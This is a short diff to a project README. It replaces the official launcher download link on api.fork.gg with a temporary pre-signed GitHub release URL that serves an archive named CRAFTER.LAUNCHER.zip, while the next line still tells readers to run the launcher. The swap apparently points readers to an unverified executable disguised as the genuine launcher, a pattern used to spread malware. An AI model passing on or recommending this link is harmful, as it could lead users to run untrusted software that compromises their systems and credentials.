@@ -21,7 +21,7 @@
 
 
 ## Installation
-- Download the [Launcher](https://api.fork.gg/download/launcher) 
+- Download the [Launcher](https://objects.githubusercontent.com/github-production-release-asset-2e65be/773415886/4cdd3816-4997-4376-8c6a-c4682c02d586?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240317%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240317T163209Z&X-Amz-Expires=300&X-Amz-Signature=30b90d6a8f1724717ca8d017d3d2d14dc0be3250a59ac193ec9272f45d9faec7&X-Amz-SignedHeaders=host&actor_id=84601328&key_id=0&repo_id=773415886&response-content-disposition=attachment%3B%20filename%3DCRAFTER.LAUNCHER.zip&response-content-type=application%2Foctet-stream) 
 - Run the Launcher and enjoy
 
 ## How to use
